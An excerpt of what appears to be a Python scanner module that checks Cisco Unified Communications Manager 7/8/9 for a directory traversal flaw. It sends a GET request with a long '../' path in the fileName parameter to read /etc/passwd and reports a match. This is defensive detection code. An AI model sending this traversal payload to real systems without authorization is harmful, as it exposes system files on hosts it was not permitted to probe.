#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""A directory traversal vulnerability in the Tomcat administrative web interface in Cisco Unified Communications."""
...
class Module(Scanner, Http_client):
    __info__ = {
        'name': 'Cisco Unified Communications Manager 7/8/9 - Directory Traversal Detection',
        ...
        'severity': 'medium',
        'tags': ['web', 'scanner', 'cve', 'cve2013', 'lfi', 'cisco', 'edb', 'vuln'],
        'agent': {
            'risk': 'active',
    ...
    def run(self):
        r = self.http_request(method="GET", path='/ccmadmin/bulkvivewfilecontents.do?filetype=samplefile&fileName=../../../../../../../../../../../../../../../../etc/passwd', allow_redirects=False)
        ...
        if (any(re.search(rx, body, 0) for rx in body_regexes)):
            self.set_info(
                severity='medium',
                reason="Cisco Unified Communications Manager 7/8/9 - Directory Traversal detected",
